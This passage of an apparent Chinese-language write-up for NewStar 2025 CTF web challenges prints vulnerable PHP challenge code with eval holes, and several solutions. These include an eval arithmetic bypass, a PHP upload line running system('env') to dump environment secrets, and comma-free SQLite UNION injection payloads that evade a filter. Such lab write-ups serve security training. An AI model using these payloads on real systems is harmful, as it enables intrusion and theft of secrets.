+<p>接着</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_dynamic_flag</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;ICQ_FLAG&quot;</span>) ?: <span class="string">&#x27;default_flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;newstar&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;newstar&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;恭喜掌握新姿势&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\d*\/~()\s]/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;老套路了，行不行啊&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\d\s]+$/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;请输入有效的表达式&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$test</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;\$test = <span class="subst">$input</span>;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;表达式错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$test</span> == <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">generate_dynamic_flag</span>(<span class="variable">$flag_secret</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;success&#x27;&gt;拿下flag！&lt;/div&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;flag-container&#x27;&gt;&lt;div class=&#x27;flag&#x27;&gt;FLAG: <span class="subst">&#123;$flag&#125;</span>&lt;/div&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;error&#x27;&gt;大哥哥泥把数字算错了: <span class="subst">$test</span> ≠ 2025&lt;/div&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>还是代码审计</p>
+<p>payload：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~((~0)*2026))</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="黑客小W的故事（1）"><a href="#黑客小W的故事（1）" class="headerlink" title="黑客小W的故事（1）"></a>黑客小W的故事（1）</h2><p>很简单考察http协议相关内容，根据提示要求来即可。</p>
+<p>先抓包，修改点击次数即可到下一关。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/%E5%B0%8Fw1.png"
+                     
+                ></p>
+<p>接着，到蘑菇先生那，传参</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/%E5%B0%8Fw2.png"
+                     
+                ></p>
+<p>下一步用POST传一个guding</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/%E5%B0%8Fw3.png"
+                     
+                ></p>
+<p>下一步用DELETE，传入chongzi，然后到下一关，去找习奥</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/%E5%B0%8Fw4.png"
+                     
+                ></p>
+<p>修改ua头</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/%E5%B0%8Fw5.png"
+                     
+                ></p>
+<p>DashSlash&#x2F;5.0同理，注意不要忘了&#x2F;5.0，低了不行，两个一起发过去</p>
+<p>最后去到最后一关获得flag</p>
+<h2 id="strange-login"><a href="#strange-login" class="headerlink" title="strange_login"></a>strange_login</h2><p>最简单的sql注入</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/sql.png"
+                     
+                ></p>
+<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="DD加速器"><a href="#DD加速器" class="headerlink" title="DD加速器"></a>DD加速器</h2><p>；分隔造成了命令执行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/dd%E5%8A%A0%E9%80%9F%E5%99%A8.png"
+                     
+                ></p>
+<h2 id="白帽小K的故事（1）"><a href="#白帽小K的故事（1）" class="headerlink" title="白帽小K的故事（1）"></a>白帽小K的故事（1）</h2><p>一道文件上传的题目，多了一层寻找接口</p>
+<p>以下为敏感接口</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/%E7%99%BD%E5%B8%BD%E5%B0%8Fk1.png"
+                     
+                ></p>
+<p>结合js代码，尝试访问这个接口</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/%E5%B0%8Fk2.png"
+                     
+                ></p>
+<p>由此图可以发现服务器正在将star.mp3文件当作php代码去解析，那么在这里我们便能进行文件上传了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/%E5%B0%8Fk3.png"
+                     
+                ></p>
+<p>直接解析了8.mp3中的内容:</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;env&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="真的是签到诶"><a href="#真的是签到诶" class="headerlink" title="真的是签到诶"></a>真的是签到诶</h2><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cipher</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cipher&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">atbash</span>(<span class="params"><span class="variable">$text</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="variable">$text</span>) <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$char</span>)) &#123;</span><br><span class="line">      <span class="variable">$is_upper</span> = <span class="title function_ invoke__">ctype_upper</span>(<span class="variable">$char</span>);</span><br><span class="line">      <span class="variable">$base</span> = <span class="variable">$is_upper</span> ? <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) : <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">      <span class="variable">$offset</span> = <span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$char</span>)) - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">      <span class="variable">$new_char</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$base</span> + (<span class="number">25</span> - <span class="variable">$offset</span>));</span><br><span class="line">      <span class="variable">$result</span> .= <span class="variable">$new_char</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$result</span> .= <span class="variable">$char</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cipher</span>) &#123;</span><br><span class="line">  <span class="variable">$cipher</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cipher</span>);</span><br><span class="line">  <span class="variable">$encoded</span> = <span class="title function_ invoke__">atbash</span>(<span class="variable">$cipher</span>);</span><br><span class="line">  <span class="variable">$encoded</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$encoded</span>);</span><br><span class="line">  <span class="variable">$encoded</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$encoded</span>);</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="variable">$encoded</span>);</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$question</span> = <span class="string">&quot;真的是签到吗？&quot;</span>;</span><br><span class="line"><span class="variable">$answer</span> = <span class="string">&quot;真的很签到诶！&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> =  <span class="variable">$question</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$answer</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span> . <span class="variable">$res</span> . <span class="variable">$res</span> . <span class="variable">$res</span> . <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>
+
+<p>代码审计题目</p>
+<p>编码链逻辑为：先进行base64解码-&gt;接着执行atbash-&gt;再删除所有的空格-&gt;再进行rot13-&gt;最后命令执行</p>
+<p>我们发送逻辑需要与之相反</p>
+<p>Atbash 是一种替换密码：A → Z, B → Y, C → X, …, Z → A  a → z, b → y, c → x, …, z → a  非字母字符保持不变</p>
+<p>payload：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/%E7%AD%BE%E5%88%B0.png"
+                     
+                ></p>
+<h2 id="搞点哦润吉吃吃橘"><a href="#搞点哦润吉吃吃橘" class="headerlink" title="搞点哦润吉吃吃橘"></a>搞点哦润吉吃吃橘</h2><p>脚本题，头疼，写不来。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pyperclip</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储上次剪贴板的内容，以检测是否有新的表达式</span></span><br><span class="line">last_clipboard_content = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_token</span>(<span class="params">expression</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解析表达式字符串，使用当前时间计算 Token，并返回结果。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 正则表达式寻找 &quot;* 数字) ^ 0x十六进制&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;\*\s*(\d+)\)\s*\^\s*(0x[0-9a-fA-F]+)&#x27;</span>, expression)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="comment"># 如果不是有效的表达式格式，则忽略</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        multiplier = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">        xor_hex = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">        xor_value = <span class="built_in">int</span>(xor_hex, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取当前 Unix 时间戳</span></span><br><span class="line">    t = <span class="built_in">int</span>(time.time())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算 Token: (t * multiplier) ^ xor_value</span></span><br><span class="line">    token = (t * multiplier) ^ xor_value</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+] 发现新表达式并计算:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  - 表达式: <span class="subst">&#123;expression.strip()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  - 乘数/异或值: <span class="subst">&#123;multiplier&#125;</span> / <span class="subst">&#123;xor_hex&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  - 使用时间戳 (t): <span class="subst">&#123;t&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  - 计算出的 Token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(token)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">monitor_clipboard</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    持续监控剪贴板内容，检测到有效表达式后进行计算和替换。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> last_clipboard_content</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; 脚本正在运行。请在网页上点击&#x27;开始验证&#x27;并复制新的表达式。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; 发现新表达式后，答案会瞬间替换您的剪贴板内容。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; 按 Ctrl+C 停止脚本。&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化 last_clipboard_content</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        last_clipboard_content = pyperclip.paste().strip()</span><br><span class="line">    <span class="keyword">except</span> pyperclip.PyperclipException:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 错误：无法访问剪贴板。请确保您在命令行环境中运行，或者尝试手动输入版本。&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 1. 读取当前剪贴板内容</span></span><br><span class="line">            current_clipboard_content = pyperclip.paste().strip()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 2. 检测内容是否更新 且 长度合理（排除空内容和很短的内容）</span></span><br><span class="line">            <span class="keyword">if</span> current_clipboard_content != last_clipboard_content <span class="keyword">and</span> <span class="built_in">len</span>(current_clipboard_content) &gt; <span class="number">20</span>:</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 3. 尝试计算 Token</span></span><br><span class="line">                token_result = calculate_token(current_clipboard_content)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> token_result:</span><br><span class="line">                    <span class="comment"># 4. 计算成功，将 Token 答案写入剪贴板</span></span><br><span class="line">                    pyperclip.copy(token_result)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n&lt;&lt;&lt; 答案已写入剪贴板！请立即粘贴提交。&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">                    <span class="comment"># 更新 last_clipboard_content 为计算结果，避免重复触发</span></span><br><span class="line">                    last_clipboard_content = token_result</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># 如果不是有效的表达式，仅更新 last_clipboard_content，避免重复触发检查</span></span><br><span class="line">                    last_clipboard_content = current_clipboard_content</span><br><span class="line">                    </span><br><span class="line">            time.sleep(<span class="number">0.5</span>) <span class="comment"># 每 0.5 秒检查一次剪贴板</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n脚本已停止。&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> pyperclip.PyperclipException:</span><br><span class="line">            <span class="comment"># 忽略一些剪贴板访问错误</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 发生未知错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    monitor_clipboard()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>专业里大佬的脚本</p>
+<h2 id="小-E-的管理系统"><a href="#小-E-的管理系统" class="headerlink" title="小 E 的管理系统"></a><strong>小 E 的管理系统</strong></h2><p>根据提示先进行fuzz，看看过滤了哪些东西</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/sqlwaf.png"
+                     
+                ></p>
+<p>很多如#，—+，–，&#x3D;，；，‘，”等都被过滤了</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>aORDER<span class="operator">%</span><span class="number">0</span>aBY<span class="operator">%</span><span class="number">0</span>a6</span><br></pre></td></tr></table></figure></div>
+
+<p>回显</p>
+<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;error&quot;</span><span class="punctuation">:</span><span class="string">&quot;database error: Unable to prepare statement: 1st ORDER BY term out of range - should be between 1 and 5&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>判断有5列</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>aUNION<span class="operator">%</span><span class="number">0</span>aselect<span class="operator">%</span><span class="number">0</span>a<span class="operator">*</span><span class="operator">%</span><span class="number">0</span>afrom<span class="operator">%</span><span class="number">0</span>a((<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a1)A<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a2)b<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a3)C<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a4)D<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a5)E)</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>绕过逗号方式：union select * from ((select 1)A join (select 2)B join (select 3)C)</p>
+</blockquote>
+<p>回显</p>
+<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;ram&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;lastChecked&quot;</span><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span><span class="string">&quot;23%&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ram&quot;</span><span class="punctuation">:</span><span class="string">&quot;45%&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;Online&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lastChecked&quot;</span><span class="punctuation">:</span><span class="string">&quot;2025-12-03 12:24:30&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>回显点都判断出来了</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>aUNION<span class="operator">%</span><span class="number">0</span>aselect<span class="operator">%</span><span class="number">0</span>a<span class="operator">*</span><span class="operator">%</span><span class="number">0</span>afrom<span class="operator">%</span><span class="number">0</span>a((<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>asqlite_version())A<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a2)b<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a3)C<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a4)D<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a5)E)</span><br></pre></td></tr></table></figure></div>
+
+<p>回显</p>
+<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span><span class="string">&quot;23%&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ram&quot;</span><span class="punctuation">:</span><span class="string">&quot;45%&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;Online&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lastChecked&quot;</span><span class="punctuation">:</span><span class="string">&quot;2025-12-03 12:24:30&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;3.46.1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;ram&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;lastChecked&quot;</span><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>判断出数据库类型为sqlite</p>
